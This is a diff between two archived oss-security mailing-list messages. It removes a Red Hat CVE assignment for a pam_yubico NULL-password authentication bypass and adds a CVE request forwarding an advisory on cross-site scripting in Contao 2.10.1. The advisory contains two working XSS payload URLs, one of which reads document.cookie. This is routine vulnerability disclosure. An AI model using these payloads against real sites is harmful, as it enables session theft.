@@ -1,43 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/07/6
-Message-ID: <4EB7FE03.7090805@redhat.com>
-Date: Mon, 07 Nov 2011 08:49:23 -0700
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/21/30
+Message-ID: <20111121224129.GA25272@foo.fgeek.fi>
+Date: Tue, 22 Nov 2011 00:41:29 +0200
+From: Henri Salo <henri@...v.fi>
 To: oss-security@...ts.openwall.com
-CC: Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>, Nanakos Chrysostomos <nanakos@...ed-net.gr>, Dennis Gilmore <dennis@...il.us>
-Subject: Re: CVE Request -- pam_yubico -- Authentication bypass via NULL password
+Cc: sschurtz@...nline.de
+Subject: CVE-request: Contao 2.10.1 Cross-site scripting vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On 11/07/2011 04:15 AM, Jan Lieskovsky wrote:
-> Hello Kurt, Steve, vendors,
->
->   a security flaw was found in the way pam_yubico, a pluggable
-> authentication module for yubikeys, performed user authentication,
-> when 'use_first_pass' PAM configuration option was not used and
-> pam_yubico module was configured as 'sufficient' in the PAM
-> configuration. A remote attacker could use this flaw to circumvent
-> common authentication process and obtain access to the account in
-> question by providing a NULL value (pressing Ctrl-D keyboard
-> sequence) as the password string.
->
-> Relevant upstream patch:
-> [1]
-> https://github.com/Yubico/yubico-pam/commit/4712da70cac159d5ca9579c1e4fac0645b674043
->
-> References:
-> [2]
-> http://groups.google.com/group/yubico-devel/browse_thread/thread/3f179ec0e6845deb
-> [3] https://bugzilla.redhat.com/show_bug.cgi?id=733322
->
-> Could you allocate a CVE id for this?
->
-Please use CVE-2011-4120 for this issue.
-> Thank you && Regards, Jan.
-> -- 
-> Jan iankko Lieskovsky / Red Hat Security Response Team
+----- Forwarded message from sschurtz@...nline.de -----
 
+Date: Sat, 8 Oct 2011 07:59:27 GMT
+From: sschurtz@...nline.de
+To: bugtraq@...urityfocus.com
+Subject: Contao 2.10.1 Cross-site scripting vulnerability
+X-Mailer: MIME-tools 5.420 (Entity 5.420)
 
--- 
+Advisory:              	Contao 2.10.1 Cross-site scripting vulnerability
+Advisory ID:           	SSCHADV2011-025
+Author:                	Stefan Schurtz
+Affected Software:  	Successfully tested on Contao 2.10.1
+Vendor URL:          	http://www.contao.org/
+Vendor Status:       	fixed
+CVE-ID:                	-
 
--Kurt Seifried / Red Hat Security Response Team
+==========================
+Vulnerability Description:
+==========================
 
+Contao 2.10 is prone to multiple Cross-site scripting vulnerability
+
+==================
+Technical Details:
+==================
+
+http://<target>/contao-2.10.1/index.php/teachers.html?"/><script>alert('xss')</script>
+http://<target>/contao-2.10.1/index.php/teachers/'"</style></script><script>alert(document.cookie)</script>
+
+=========
+Solution:
+=========
+
+- Vendor patch available - http://dev.contao.org/projects/typolight/repository/revisions/1041
+- Release of a new version 2.10.2 next week
+
+====================
+Disclosure Timeline:
+====================
+
+07-Oct-2011 - informed developers (contao@...trobots.com)
+07-Oct-2011 - vendor fix
+08-Oct-2011 - release date of this security advisory
+
+========
+Credits:
+========
+
+Vulnerability found and advisory written by Stefan Schurtz.
+
+===========
+U
+References:
+===========
+
+http://www.contao.org/
+http://dev.contao.org/projects/typolight/repository/revisions/1041
+http://www.rul3z.de/advisories/SSCHADV2011-025.txt
+
+----- End forwarded message -----
+
+Can you assign CVE-identifier for this vulnerability?
+
+http://dev.contao.org/projects/typolight/repository/revisions/8de5b536973a38ba75ebebfff16a5f0f29d99671 (reported 10/10/2011 03:09 pm)
+http://dev.contao.org/projects/typolight/repository/revisions/b7b2c2281227ad9c1647bf1f03e6d663b8387959 (reported 10/07/2011 01:33 pm)
+
+Best regards,
+Henri Salo
